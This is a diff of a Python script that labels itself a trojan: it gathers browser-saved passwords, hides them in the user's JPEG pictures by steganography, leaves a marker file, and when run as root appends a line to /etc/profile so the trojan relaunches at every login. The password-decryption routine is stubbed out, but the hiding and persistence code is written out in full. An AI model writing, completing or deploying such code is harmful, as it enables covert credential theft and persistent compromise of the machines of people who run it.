@@ -1,8 +1,9 @@
 import glob
-from os import path
+from os import path, geteuid
 import stepic
 import Image
 from datetime import datetime
+import sys
 
 
 # Function to encode a stego message from image
@@ -24,8 +25,6 @@ def format_msg(entry):
 	
 # Function to decrypt passwords from the browser and save in a file
 def decrypt_passwords():
-	#f = open('bootup.cfg', 'w+')
-	#f.write(str(datetime.now()))
 	msglist = []
 	# Code to decrypt from firefox or chrom
 	# Code
@@ -37,21 +36,33 @@ def decrypt_passwords():
 		msglist.append(format_msg(entry))
 	return msglist
 
-# Main Function
-if (not path.exists('bootup.cfg')):
-	msglist = decrypt_passwords()		
-	num_of_msgs = msglist.__len__()
-	i = 0		#Message Iterator
+
+
+# Function to initialize first time run
+def first_run():
+	msglist = decrypt_passwords()			# List of browser saved passwords
+	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
+	i = 0									# Message Iterator
 	picdir = path.expanduser("~/Pictures/Pictures/")
 	for infile in glob.glob(picdir+"*.jpg"):
 		i = (i+1)%num_of_msgs;
 		encode(infile,msglist[i]);
+	f = open('bootup.cfg', 'w+')
+	f.write(str(datetime.now()))
+	f.close()
+	if geteuid() == 0:
+		f = open('/etc/profile','a')
+		f.write("sudo python trojan.py&");
+		f.close()
+	for infile in glob.glob(picdir+"*.jpg"):
+		print decode(infile);		
+	
+	
+	
+# Main Function
+if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
+	first_run()
 
 	
-	
-picdir = path.expanduser("~/Pictures/Pictures/")
-i=0
-for infile in glob.glob(picdir+"*.jpg"):
-	i = i+1;
-	#encode(infile,"06qwerty"+str(i)+"shamilcm#G############");
-	print decode(infile)
+
+
